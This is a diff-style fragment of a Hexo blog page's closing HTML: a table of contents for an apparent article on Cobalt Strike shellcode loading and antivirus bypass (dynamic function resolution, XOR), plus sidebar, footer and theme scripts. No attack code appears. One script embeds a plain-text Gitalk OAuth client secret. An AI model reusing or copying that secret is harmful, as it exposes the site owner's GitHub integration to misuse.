+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode-%E7%94%9F%E6%88%90"><span class="toc-number">1.</span> <span class="toc-text">shellcode 生成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cs"><span class="toc-number">1.0.1.</span> <span class="toc-text">cs</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E5%8A%A0%E8%BD%BD%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">shellcode加载步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">其他执行方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="toc-number">3.0.1.</span> <span class="toc-text">内联汇编</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="toc-number">3.0.2.</span> <span class="toc-text">线程执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%82%B9%E7%82%B9Bypass"><span class="toc-number">4.</span> <span class="toc-text">一点点Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0"><span class="toc-number">4.0.1.</span> <span class="toc-text">动态获取函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">加密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xor"><span class="toc-number">4.1.1.</span> <span class="toc-text">xor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
+  <div class="sidebar-author-name">Yyjccc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">45</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2024
+      <span class="footer-info-sep"></span>
+      Yyjccc
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        154.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        10:30
+      </div>
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode-%E7%94%9F%E6%88%90"><span class="toc-number">1.</span> <span class="toc-text">shellcode 生成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cs"><span class="toc-number">1.0.1.</span> <span class="toc-text">cs</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E5%8A%A0%E8%BD%BD%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">shellcode加载步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">其他执行方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="toc-number">3.0.1.</span> <span class="toc-text">内联汇编</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="toc-number">3.0.2.</span> <span class="toc-text">线程执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%82%B9%E7%82%B9Bypass"><span class="toc-number">4.</span> <span class="toc-text">一点点Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0"><span class="toc-number">4.0.1.</span> <span class="toc-text">动态获取函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">加密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xor"><span class="toc-number">4.1.1.</span> <span class="toc-text">xor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
+  <div class="sidebar-author-name">Yyjccc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">45</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/gitalk/dist/gitalk.min.js" data-pjax></script>
+
+  
+  <script data-pjax>
+    var gitalkId = location.pathname;
+    var gitalk = new Gitalk({
+      clientID: '0efb4a442bc09d1ba17e',
+      clientSecret: 'd26f520fef841de4f4388029a0d5c0f4730357cf',
+      repo: 'https://github.com/Yyjccc/yyjccc.github.io.git',
+      owner: 'Yyjccc',
+      admin: "Yyjccc",
+      id: gitalkId, // Ensure uniqueness and length less than 50
+      distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    if (document.getElementById('comments')) {
+      gitalk.render('comments')
+    }
+  </script>
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.0-alpha.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+  </html>
+
